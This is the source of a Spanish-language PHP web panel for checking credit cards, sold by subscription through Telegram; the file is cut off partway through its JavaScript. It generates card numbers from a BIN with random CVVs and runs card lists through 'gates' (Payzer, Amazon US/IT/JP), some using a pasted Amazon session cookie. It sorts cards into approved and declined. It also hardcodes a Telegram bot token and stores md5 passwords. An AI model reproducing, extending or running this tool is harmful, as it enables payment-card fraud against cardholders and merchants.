<?php
session_start();
error_reporting(0);
$users_file = 'users.json';
$logs_file = 'logs.json';
require_once 'functions.php';

function sendToTelegram($message) {
    $botToken = '7965095632:AAHqNE5YHCr-UXdcZaShjPZzmelQDkQsWXA';
    $chatId = '5325383844';
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $message];
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}

if (file_exists($users_file)) {
    $users = json_decode(file_get_contents($users_file), true);
} else {
    $users = [];
}

function saveUsers($users, $file) {
    return file_put_contents($file, json_encode($users, JSON_PRETTY_PRINT)) !== false;
}

function saveLog($username, $action) {
    global $logs_file;
    $logs = file_exists($logs_file) ? json_decode(file_get_contents($logs_file), true) : [];
    $logs[] = [
        'username' => $username,
        'action' => $action,
        'ip' => $_SERVER['REMOTE_ADDR'],
        'browser' => $_SERVER['HTTP_USER_AGENT'],
        'timestamp' => date('Y-m-d H:i:s')
    ];
    file_put_contents($logs_file, json_encode($logs, JSON_PRETTY_PRINT));
}

if (isset($_POST['login'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    if (isset($users[$username]) && $users[$username]['password'] === md5($password)) {
        $expiration = strtotime($users[$username]['expiration']);
        if ($expiration > time()) {
            $_SESSION['username'] = $username;
            $_SESSION['expiration'] = $users[$username]['expiration'];
            $_SESSION['last_login'] = $users[$username]['last_login'] ?? date('Y-m-d H:i:s');
            $users[$username]['last_login'] = date('Y-m-d H:i:s');
            saveUsers($users, $users_file);
            saveLog($username, 'Inicio de sesión exitoso');
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "¡La cuenta ha expirado!";
            saveLog($username, 'Intento de inicio de sesión - Cuenta expirada');
        }
    } else {
        $error = "¡Usuario o contraseña incorrectos!";
        saveLog($username, 'Intento de inicio de sesión fallido');
    }
}

if (isset($_GET['logout'])) {
    saveLog($_SESSION['username'], 'Cierre de sesión');
    session_destroy();
    header('Location: index.php');
    exit;
}

$is_admin_page = isset($_GET['page']) && $_GET['page'] === 'admin';
$admin_logged = isset($_SESSION['username']) && $_SESSION['username'] === 'admin';

if ($is_admin_page && !$admin_logged) {
    $admin_login_required = true;
} elseif (!isset($_SESSION['username'])) {
    $login_required = true;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Checker VIP ONE</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css">
    <style type="text/css">

body {
    background: #2E294E; /* Fondo morado oscuro */
    min-height: 100vh;
        overflow-x: hidden;
        font-family: 'Orbitron', sans-serif; /* Tipografía futurista */
    color: #FFFFFF; /* Texto blanco */
        margin: 0;
        padding: 0;
    }


@keyframes float {
    0%, 100% { transform: translateY(0) rotate(0deg); }
    50% { transform: translateY(-40px) rotate(10deg); }
}

@keyframes connect {
    0%, 100% { opacity: 0.3; height: 50px; }
    50% { opacity: 0.8; height: 70px; }
}

/* Estilos para las tarjetas (cards) */
.card {
    background: rgba(46, 41, 78, 0.9); /* Fondo morado oscuro semi-transparente */
    border: 1px solid #FF6F61; /* Borde coral */
    border-radius: 10px;
    padding: 20px;
    margin: 10px;
    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
}

.card:hover {
    border-color: #FFD166; /* Borde amarillo dorado al pasar el mouse */
}

.nav-tabs {
    background: rgba(20, 37, 68, 0.9);
    border-radius: 16px 16px 0 0;
    border-bottom: 1px solid rgba(81, 203, 238, 0.2);
}

.nav-tabs .nav-link {
    color: #b3c7ff;
    border: none;
    padding: 12px 20px;
    transition: all 0.3s ease;
}

.nav-tabs .nav-link:hover {
    color: #e0e7ff;
}

.nav-tabs .nav-link.active {
    background: rgba(81, 203, 238, 0.2);
    color: #e0e7ff;
    border-radius: 12px 12px 0 0;
}

.tab-content {
    background: rgba(20, 37, 68, 0.85);
    border-radius: 0 0 16px 16px;
    padding: 20px;
    border: 1px solid rgba(81, 203, 238, 0.2);
    border-top: none;
}

    /* Estilos para los inputs */
    textarea, .cookie-input, input[type="text"], input[type="password"], input[type="date"], select {
        background: rgba(20, 37, 68, 0.5); /* Fondo oscuro para inputs */
        color: #e0e7ff; /* Texto claro */
        border: 1px solid rgba(81, 203, 238, 0.3); /* Borde azul */
        border-radius: 10px;
        padding: 12px auto;
        box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.2);
        transition: all 0.3s ease;
        font-size: 14px;
    }

    textarea:focus, .cookie-input:focus, input:focus, select:focus {
        outline: none;
        border-color: #51cbee; /* Borde azul más intenso al enfocar */
        background: rgba(20, 37, 68, 0.7); /* Fondo más claro al enfocar */
        box-shadow: 0 0 12px rgba(81, 203, 238, 0.4); /* Sombra azul al enfocar */
    }

textarea::placeholder, .cookie-input::placeholder, input::placeholder {
    color: rgba(224, 231, 255, 0.6);
}
@media (max-width: 768px) {
    .container {
        padding: 10px;
    }
    .card {
        margin: 5px;
        padding: 15px;
    }
    .btn {
        width: 40%;
        margin-bottom: 5px;
    }
}

input, textarea, select {
    background: rgba(46, 41, 78, 0.7); /* Fondo morado oscuro semi-transparente */
    border: 1px solid #FF6F61; /* Borde coral */
    border-radius: 8px;
    padding: 10px;
    color: #FFFFFF; /* Texto blanco */
}

input:focus, textarea:focus, select:focus {
    border-color: #FFD166; /* Borde amarillo dorado al enfocar */
    box-shadow: 0 0 8px rgba(255, 209, 102, 0.4); /* Sombra dorada */
}
/* Estilos para los títulos */
h1, h2, h3, h4, h5, h6 {
    color: #FFD166; /* Amarillo dorado */
}
    
    h1 { font-size: 2rem; }
h2 { font-size: 1.75rem; }
p { font-size: 1rem; }


    /* Estilos para los enlaces */
    a {
    color: #FF6F61; /* Coral */
    text-decoration: none;
}

a:hover {
    color: #FFD166; /* Amarillo dorado al pasar el mouse */
}
.btn:hover {
    opacity: 0.9;
}

    .btn {
    border-radius: 8px;
    padding: 10px 20px;
    font-size: 14px;
    transition: background-color 0.3s ease;
}
 /* Estilos para los botones */
 .btn-primary {
    background-color: #FF6F61; /* Coral vibrante */
    border: none;
    color: #FFFFFF; /* Texto blanco */
}

.btn-primary:hover {
    background-color: #E65A50; /* Coral más oscuro al pasar el mouse */
}

.btn-dark {
    background-color:rgb(52, 19, 220); /* Verde menta */
    border: none;
    color: #FFFFFF; /* Texto blanco */
}

.btn-dark:hover {
    background-color: #05B88A; /* Verde menta más oscuro al pasar el mouse */
}

.btn-danger {
    background: #8b1e3f;
    border: none;
    border-radius: 10px;
    color: #e0e7ff;
}

.btn-danger:hover {
    background: #a3244d;
    box-shadow: 0 6px 15px rgba(163, 36, 77, 0.3);
}

.btn-success {
    background-color: #28a745;
    border: none;
    border-radius: 5px;
    padding: 10px 20px;
    color: #fff;
    transition: background-color 0.3s ease;
}

.btn-success:hover {
    background-color: #218838;
}

.modal-content {
    background: rgba(46, 41, 78, 0.95); /* Fondo morado oscuro semi-transparente */
    border: 1px solid #FF6F61; /* Borde coral */
    border-radius: 15px;
}

.modal-header {
    border-bottom: 1px solid #FF6F61; /* Borde coral */
}

.modal-footer {
    border-top: 1px solid #FF6F61; /* Borde coral */
}


.modal-title {
    font-weight: 600;
}

.modal-body {
    padding: 25px 30px;
}

.close {
    color: #e0e7ff;
    opacity: 0.7;
    text-shadow: none;
}

.close:hover {
    opacity: 1;
}

#generator-popup {
    display: none;
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: rgba(0, 2, 5, 0.98);
    border: 1px solid rgba(81, 203, 238, 0.2);
    border-radius: 10px;
    padding: 20px;
    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
    z-index: 1000;
    width: 300px;
}

#close-generator {
    color: #e0e7ff;
    font-size: 18px;
}

#close-generator:hover {
    color: #51cbee;
}

.table-dark {
    background: rgba(46, 41, 78, 0.8); /* Fondo morado oscuro semi-transparente */
    color: #FFFFFF; /* Texto blanco */
    border-radius: 10px;
    overflow: hidden;
}

.table-dark th, .table-dark td {
    border-color: rgba(255, 111, 97, 0.2); /* Borde coral semi-transparente */
}

.table-dark th {
    background: rgba(255, 111, 97, 0.3); /* Fondo coral semi-transparente */
}

.form-group i {
    position: absolute;
    left: 15px;
    top: 50%;
    transform: translateY(-50%);
    color: rgba(81, 203, 238, 0.6);
}

.form-group input {
    padding-left: 40px;
}

.badge-warning { background: #FFD166; } /* Amarillo dorado */
.badge-success { background: #06D6A0; } /* Verde menta */
.badge-danger { background: #FF6F61; } /* Coral */
.badge-info { background: #2E294E; } /* Morado oscuro */
.badge-secondary { background: #4A4453; } /* Morado grisáceo */

#toast-container > .toast-success {
    background-color: rgba(30, 133, 84, 0.9);
    border: 1px solid rgba(81, 203, 238, 0.3);
    color: #e0e7ff;
    backdrop-filter: blur(5px);
}

#toast-container > .toast-error {
    background-color: rgba(139, 30, 63, 0.9);
    border: 1px solid rgba(81, 203, 238, 0.3);
    color: #e0e7ff;
    backdrop-filter: blur(5px);
}

#toast-container > .toast-info {
    background-color: rgba(42, 84, 133, 0.9);
    border: 1px solid rgba(81, 203, 238, 0.3);
    color: #e0e7ff;
    backdrop-filter: blur(5px);
}

#toast-container > .toast-warning {
    background-color: rgba(217, 119, 6, 0.9);
    border: 1px solid rgba(81, 203, 238, 0.3);
    color: #e0e7ff;
    backdrop-filter: blur(5px);
}
    </style>
    <style>
        body {
            font-family: 'Arial', sans-serif;

            /* background: linear-gradient(135deg,rgb(32, 32, 32),rgb(15, 15, 15)); */
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;

            background-color: #0F1116;
            color: #FFF;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .login-container {
            background-color: #181A1E;
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
            animation: fadeIn 1s ease-in-out;
            position: relative;
        }
        .login-container h2 {
            color: #7E57C2;
            margin-bottom: 20px;
            font-weight: bold;
        }
        .input-container {
            position: relative;
            margin-bottom: 20px;
        }
        .input-container input {
            width: 100%;
            padding: 10px;
            border: 1px solid #673AB7;
            border-radius: 5px;
            background-color: #0F1116;
            color: #FFF;
            padding-left: 40px;
            box-sizing: border-box;
        }
        .input-container .icon {
            position: absolute;
            left: 10px;
            top: 50%;
            transform: translateY(-50%);
            color: #673AB7;
        }
        .login-container input[type="submit"] {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 5px;
            background-color: #673AB7;
            color: #FFF;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .login-container input[type="submit"]:hover {
            background-color: #512DA8;
        }
        .login-container a {
            color: #7E57C2;
            text-decoration: none;
            display: block;
            margin-top: 10px;
            transition: color 0.3s ease;
        }
        .login-container a:hover {
            color: #D1C4E9;
        }
        .logo {
            font-size: 5rem;
            color: #7E57C2;
            margin-bottom: 20px;
        }
        @media (max-width: 480px) {
            .login-container {
                padding: 15px;
            }
            .login-container input[type="text"],
            .login-container input[type="password"] {
                padding: 8px 30px 8px 40px;
            }
            .login-container input[type="submit"] {
                padding: 8px;
                font-size: 14px;
            }
        }
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-screen {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .loading-screen.active {
            display: flex;
        }
        .loading-icon {
            font-size: 3rem;
            color: #673AB7;
            animation: spin 1s linear infinite;
        }
        footer {
      background: rgba(46, 41, 78, 0.9); /* Fondo morado oscuro semi-transparente */
       color: #FFD166; /* Amarillo dorado */
       padding: 10px;
       text-align: center;
       position: fixed;
       bottom: 0;
       width: 100%;
        }

.card, .btn, .modal-content {
    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
}
        footer .fa-heart {
            color: red;
        }
        footer .fa-copyright {
            color: #7E57C2;
        }
        #bin-info-popup {
    background: rgba(20, 37, 68, 0.95);
    color: #e0e7ff;
    border-radius: 15px;
    border: 1px solid rgba(81, 203, 238, 0.2);
    box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4);
    backdrop-filter: blur(10px);
}

#bin-info-popup h5 {
    color: #00b4d8;
    margin-bottom: 15px;
}

#bin-info-result {
    color: #e0e7ff;
}
    </style>
</head>
<body>
    <input type="hidden" value="<?php echo isset($base64Value) ? $base64Value : ''; ?>" name="token_api" id="token_api">

    <?php if (isset($_SESSION['username']) && !$is_admin_page): ?>
    <div class="container p-0 mt-3">
        <a href="?logout" class="btn btn-dark shadow"><i class="fa-solid fa-right-from-bracket"></i> Cerrar sesión</a>
        <?php if ($_SESSION['username'] === 'admin'): ?>
        <a href="?page=admin" class="btn btn-dark shadow ml-2"><i class="fa-solid fa-user-gear"></i> Admin</a>
        <?php endif; ?>
    </div>

    <div class="container mt-4">
        <div class="card p-4">
            <h3><i class="fa-solid fa-gears"></i> CHECKER VIPONE</h3>
            <p>Usuario: <?php echo $_SESSION['username']; ?> | Vence el: <?php echo $_SESSION['expiration']; ?> | Último inicio de sesión: <?php echo date('m/d/Y H:i:s', strtotime($_SESSION['last_login'])); ?></p>
            
<div class="mt-3">
<button class="btn btn-dark" id="chk-start" disabled><i class="fa-solid fa-play"></i> Iniciar</button>
<!-- <button class="btn btn-dark" id="chk-pause" disabled><i class="fa-solid fa-pause"></i> Pausar</button> -->
<button class="btn btn-dark" id="chk-stop" disabled><i class="fa-solid fa-stop"></i> Detener</button>
<button class="btn btn-dark" id="chk-clean"><i class="fa-solid fa-trash-can"></i> Limpiar</button>
<button class="btn btn-dark" id="btn-generator"><i class="fa-solid fa-credit-card"></i> Generador</button>
<button class="btn btn-dark" id="btn-bin-info"><i class="fa-solid fa-magnifying-glass"></i> Info BIN</button>
</div>

            <div id="generator-popup">
                <h5>Generador de Tarjetas <span id="close-generator" style="cursor: pointer; float: right;">❌</span></h5>
                <div class="form-group">
                    <label for="bin-input">Primeros dígitos (BIN)</label>
                    <input type="text" id="bin-input" class="form-control" placeholder="Ej: 53126085" maxlength="15">
                </div>
                <div class="form-group">
                    <label for="month-select">Mes</label>
                    <select id="month-select" class="form-control">
                        <option value="01">Enero</option>
                        <option value="02">Febrero</option>
                        <option value="03">Marzo</option>
                        <option value="04">Abril</option>
                        <option value="05">Mayo</option>
                        <option value="06">Junio</option>
                        <option value="07">Julio</option>
                        <option value="08">Agosto</option>
                        <option value="09">Septiembre</option>
                        <option value="10">Octubre</option>
                        <option value="11">Noviembre</option>
                        <option value="12">Diciembre</option>
                    </select>
                </div>
                <div class="form-group">
                    <label for="year-select">Año</label>
                    <select id="year-select" class="form-control">
                        <option value="2025">2025</option>
                        <option value="2026">2026</option>
                        <option value="2027">2027</option>
                        <option value="2028">2028</option>
                        <option value="2029">2029</option>
                        <option value="2030">2030</option>
                        <option value="2031">2031</option>
                        <option value="2032">2032</option>
                        <option value="2033">2033</option>
                        <option value="2034">2034</option>
                        <option value="2035">2035</option>
                        <option value="2036">2036</option>
                    </select>
                </div>
                <div class="form-group">
                    <label for="cvv-input">CVV (opcional)</label>
                    <input type="text" id="cvv-input" class="form-control" placeholder="Dejar en blanco para CVV aleatorio" maxlength="3">
                </div>
                <div class="form-group">
                    <label for="quantity-input">Cantidad</label>
                    <input type="number" id="quantity-input" class="form-control" placeholder="Ej: 10">
                </div>
                <button class="btn btn-dark" id="chk-generator"><i class="fa-solid fa-plus"></i> Generar</button>
            </div>

            <!-- Ventana emergente para Info BIN -->
<div id="bin-info-popup" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0, 2, 5, 0.98); border: 1px solid rgba(81, 203, 238, 0.2); border-radius: 10px; padding: 20px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); z-index: 1000; width: 300px;">
    <h5>Consulta de BIN <span id="close-bin-info" style="cursor: pointer; float: right;">❌</span></h5>
    <div class="form-group">
        <label for="bin-input-info">Ingresa los primeros 6 dígitos:</label>
        <input type="text" id="bin-input-info" class="form-control" placeholder="Ej: 531260" maxlength="6">
    </div>
    <button class="btn btn-dark" id="chk-bin-info"><i class="fa-solid fa-search"></i> Buscar</button>
    <div id="bin-info-result" class="mt-3"></div>
</div>

            <div class="mt-3">
                <span class="badge badge-warning" id="estatus">Esperando para iniciar...</span>
            </div>

            <div class="mt-3 d-flex">
                <div class="mr-3">
                    <label for="api-select">ELIJE GATE👇🏻:</label>
                    <select id="api-select" class="form-control cookie-input mb-2">
    <option value="">-- 🔥Gates🔥 --</option>
    <option value="payzer.php">VipOne (PAYZER)</option>
    <option value="us.php">Amazon (US)</option>
    <option value="it.php">Amazon (IT)</option>
    <option value="jp.php">Amazon (JP)</option>
</select>
                </div>
                <div>
                    <label for="thread-select">Velocidad:</label>
                    <select id="thread-select" class="form-control cookie-input mb-2">
                        <option value="1">1x</option>
                        <option value="2">2x</option>
                        <option value="3">3x</option>
                        <option value="4">4x</option>
                        <option value="20">20x</option>
                    </select>
                </div>
            </div>

            <ul class="nav nav-tabs mt-3" id="myTab" role="tablist">
                <li class="nav-item">
                    <a class="nav-link active" id="home-tab" data-toggle="tab" href="#chk-home" role="tab"><i class="fa-solid fa-credit-card"></i></a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" id="profile-tab" data-toggle="tab" href="#chk-lives" role="tab"><i class="fa-solid fa-thumbs-up"></i></a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" id="contact-tab" data-toggle="tab" href="#chk-dies" role="tab"><i class="fa-solid fa-thumbs-down"></i></a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" id="errors-tab" data-toggle="tab" href="#chk-errors" role="tab"><i class="fa-solid fa-circle-xmark"></i></a>
                </li>
            </ul>
            <div class="tab-content">
                <div class="tab-pane fade show active p-3" id="chk-home" role="tabpanel">
                    <div class="mb-2">
                        Aprobadas: <span class="val-lives">0</span> |
                        Rechazadas: <span class="val-dies">0</span> |
                        Errores: <span class="val-errors">0</span> |
                        Probadas: <span class="val-tested">0</span> |
                        Total: <span class="val-total">0</span>
                    </div>
                    <input type="text" id="cookie-input-2" placeholder="INSERTAR COOKIE: AMAZON" class="cookie-input form-control mb-2">
                    <textarea id="card_list" placeholder="Insertar tu lista..." rows="8" class="cookie-input form-control"></textarea>
                </div>
                <div class="tab-pane fade p-3" id="chk-lives" role="tabpanel">
                    <h5>Aprobadas (<span class="val-lives">0</span>)</h5>
                    <button class="btn btn-dark" id="copyButton"><i class="fa-solid fa-copy"></i></button>
                    <button class="btn btn-dark" onclick="clearLives()"><i class="fa-solid fa-trash-can"></i></button>
                    <div id="lives" style="overflow:auto;"></div>
                </div>
                <div class="tab-pane fade p-3" id="chk-dies" role="tabpanel">
                    <h5>Rechazadas (<span class="val-dies">0</span>)</h5>
                    <button class="btn btn-dark" onclick="clearDies()"><i class="fa-solid fa-trash-can"></i></button>
                    <div id="dies" style="overflow:auto;"></div>
                </div>
                <div class="tab-pane fade p-3" id="chk-errors" role="tabpanel">
                    <h5>Errores (<span class="val-errors">0</span>)</h5>
                    <button class="btn btn-dark" onclick="clearErrors()"><i class="fa-solid fa-trash-can"></i></button>
                    <div id="errors" style="overflow:auto;"></div>
                </div>
            </div>
        </div>
    </div>

    <?php elseif ($is_admin_page && $admin_logged): ?>
    <div class="container mt-4">
        <div class="card p-4">
            <h3><i class="fa-solid fa-user-gear"></i> Admin Panel</h3>
            <a href="index.php" class="btn btn-dark shadow mb-3"><i class="fa-solid fa-arrow-left"></i> Back</a>
            
            <div class="mb-4">
                <h5>Add New User</h5>
                <form id="addUserForm">
                    <div class="form-group">
                        <input type="text" name="new_username" class="form-control cookie-input" placeholder="Username" required>
                    </div>
                    <div class="form-group">
                        <input type="password" name="new_password" class="form-control cookie-input" placeholder="Password" required>
                    </div>
                    <div class="form-group">
                        <input type="date" name="expiration" class="form-control cookie-input" required>
                    </div>
                    <div class="form-group">
                        <input type="text" name="telegram_id" class="form-control cookie-input" placeholder="Telegram ID" required>
                    </div>
                    <button type="button" class="btn btn-primary" data-toggle="modal" data-target="#confirmAddModal">Add</button>
                </form>
            </div>

            <h5>Registered Users</h5>
            <div class="table-responsive">
                <table class="table table-dark">
                    <thead>
                        <tr>
                            <th>Username</th>
                            <th>Expiration</th>
                            <th>Last Login</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody id="usersTable">
                        <?php foreach ($users as $username => $data): ?>
                            <?php if ($username !== 'admin'): ?>
                                <tr data-user="<?php echo $username; ?>">
                                    <td><?php echo $username; ?></td>
                                    <td><?php echo $data['expiration']; ?></td>
                                    <td><?php echo $data['last_login'] ?? 'Never'; ?></td>
                                    <td>
                                        <button class="btn btn-sm btn-primary edit-user" data-user="<?php echo $username; ?>">Edit</button>
                                        <button class="btn btn-sm btn-danger delete-user" data-user="<?php echo $username; ?>">Delete</button>
                                        <button class="btn btn-sm btn-success renew-user" data-user="<?php echo $username; ?>">Renew</button>
                                    </td>
                                </tr>
                            <?php endif; ?>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>

            <h5 class="mt-4">System Logs</h5>
            <div class="table-responsive">
                <table class="table table-dark">
                    <thead>
                        <tr>
                            <th>Date/Time</th>
                            <th>Username</th>
                            <th>Action</th>
                            <th>IP</th>
                            <th>Browser</th>
                        </tr>
                    </thead>
                    <tbody id="logsTable">
                        <?php 
                        $logs = file_exists($logs_file) ? array_reverse(json_decode(file_get_contents($logs_file), true)) : [];
                        foreach ($logs as $log): ?>
                            <tr>
                                <td><?php echo $log['timestamp']; ?></td>
                                <td><?php echo $log['username']; ?></td>
                                <td><?php echo $log['action']; ?></td>
                                <td><?php echo $log['ip']; ?></td>
                                <td><?php echo substr($log['browser'], 0, 50) . '...'; ?></td>
                            </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
    <?php endif; ?>

    <?php if (isset($login_required) || isset($admin_login_required)): ?>
    <!--  -->
    <div class="login-container">
        <!-- <i class="fas fa-moon logo"></i> -->
        <h2>VIP ONE - LOGIN</h2>
        <form method="POST">
            <div class="input-container">
                <i class="fas fa-moon icon"></i>
                <!-- <input type="text" name="usuario" placeholder="Nome de usuário" required> -->
                <input type="text" name="username" class="form-control cookie-input i1" placeholder="Username" required>
            </div>
            <div class="input-container">
                <i class="fas fa-moon icon"></i>
                <!-- <input type="password" name="senha" placeholder="Senha" required> -->
                <input type="password" name="password" class="form-control cookie-input i1" placeholder="Password" required>
            </div>
            <?php if (isset($error)): ?>
                <div class="alert alert-danger d-flex align-items-center" role="alert">
                    <i class="fa-solid fa-circle-exclamation mr-2"></i>
                    <?php echo $error; ?>
                </div>
            <?php endif; ?>

            <input type="submit" name="login" value="Entrar">
        </form>
        <spam style="display: inline;"><a href="https://t.me/RECARGASVIPONE">COMPRAR ACCESO</a></spam>
        <!-- <div class="text-center mt-3">
            <small class="text-muted">Authentication - MENITOS © 2025</small>
        </div> -->
    </div>
    <footer>
        <p>&copy; 2024 RECARGASVIPONE  <i class="fas fa-moon"></i> Todos los derechos reservados.</p>
    </footer>
    <?php endif; ?>

    <div class="modal fade" id="confirmAddModal" tabindex="-1" role="dialog">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fa-solid fa-user-plus mr-2"></i>Confirm Addition</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">×</span>
                    </button>
                </div>
                <div class="modal-body">
                    Do you want to add this new user?
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button>
                    <button type="button" class="btn btn-primary" id="confirmAddBtn">Confirm</button>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="confirmDeleteModal" tabindex="-1" role="dialog">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fa-solid fa-trash-can mr-2"></i>Confirm Deletion</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">×</span>
                    </button>
                </div>
                <div class="modal-body">
                    Do you really want to delete the user <span id="deleteUserName"></span>?
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button>
                    <button type="button" class="btn btn-danger" id="confirmDeleteBtn">Delete</button>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="editUserModal" tabindex="-1" role="dialog">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fa-solid fa-user-pen mr-2"></i>Edit User</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">×</span>
                    </button>
                </div>
                <div class="modal-body">
                    <div class="form-group">
                        <label>New Password for <span id="editUserName"></span></label>
                        <input type="password" id="editPassword" class="form-control cookie-input" required>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button>
                    <button type="button" class="btn btn-primary" id="confirmEditBtn">Save</button>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="renewUserModal" tabindex="-1" role="dialog">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fa-solid fa-clock-rotate-left mr-2"></i>Renew User</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">×</span>
                    </button>
                </div>
                <div class="modal-body">
                    <p>Renew subscription for <span id="renewUserName"></span></p>
                    <div class="form-group">
                        <label>Choose duration:</label>
                        <select id="renewDays" class="form-control cookie-input">
                            <?php for ($i = 1; $i <= 30; $i++): ?>
                                <option value="<?php echo $i; ?>">+<?php echo $i; ?> days</option>
                            <?php endfor; ?>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Or set a specific date:</label>
                        <input type="date" id="renewDate" class="form-control cookie-input">
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button>
                    <button type="button" class="btn btn-success" id="confirmRenewBtn">Renew</button>
                </div>
            </div>
        </div>
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>

    <script type="text/javascript">
    const MAX_LINES = 1000;
    var cost = "0";
    var checker_description = "Checker VIP ONE";
    var audio = new Audio('live.mp3');
    var errorSound = new Audio('error.mp3');
    var audioStart = new Audio('start.mp3');
    var audioStop = new Audio('stop.mp3');
    var audioFinished = new Audio('finalizado.mp3');
    let stopped = true;
    let paused = true;
    let tested = 0;
    let total = 0;
    let lives = 0;
    let dies = 0;
    let errors = 0;

    function clearLives() { $("#lives").html(""); }
    function clearDies() { $("#dies").html(""); }
    function clearErrors() { $("#errors").html(""); }

    $(document).ready(function() {
        <?php if (isset($login_required) || isset($admin_login_required)): ?>
        $('#loginModal').modal({ backdrop: 'static', keyboard: false }).modal('show');
        <?php endif; ?>

        <?php if (isset($error)): ?>
        toastr.error("<?php echo $error; ?>");
        <?php endif; ?>

        $('#card_list').on('input', function() {
            let lines = $(this).val().split('\n').filter(line => line.trim() !== '');
            if (lines.length > MAX_LINES) {
                $(this).val(lines.slice(0, MAX_LINES).join('\n'));
                toastr.warning(`Limite máximo de ${MAX_LINES} líneas alcanzado!`);
            }
        });

        $('#api-select').change(function() {
            $("#chk-start").prop('disabled', !$(this).val());
        });

        function updateCounters() {
            $(".val-total").text(total);
            $(".val-lives").text(lives);
            $(".val-dies").text(dies);
            $(".val-errors").text(errors);
            $(".val-tested").text(tested);
        }

        function testCards(card_list, threadCount) {
            if (stopped || paused || tested >= total) {
                if (tested >= total) {
                    $("#estatus").attr("class", "badge badge-success").text("Prueba completada");
                    toastr.success(`Prueba de ${total} elementos completada`);
                    audioFinished.play();
                    enableControls();
                }
                return;
            }

            let cardsToTest = card_list.slice(tested, tested + threadCount);
            let requests = cardsToTest.map(card => {
                return $.ajax({
                    url: 'api/' + $("#api-select").val(),
                    type: 'GET',
                    data: {
                        lista: card,
                        token_api: $("#token_api").val(),
                        cookie: $("#cookie-input-2").val().trim()
                    }
                });
            });

            Promise.allSettled(requests).then(results => {
                if (stopped || paused) return;

                results.forEach((result, index) => {
                    tested++;
                    let card = cardsToTest[index];
                    if (result.status === 'fulfilled') {
                        let response = result.value;
                        if (response.indexOf("Approved") >= 0) {
                            lives++;
                            $("#lives").append(response + "<br>");
                            $("#estatus").attr("class", "badge badge-success").text(card + " -> APROBADA");
                            toastr.success("¡Aprobada! " + card);
                            audio.play();

                            var timeMatch = response.match(/Tiempo de respuesta: \((\d+s)\)/);
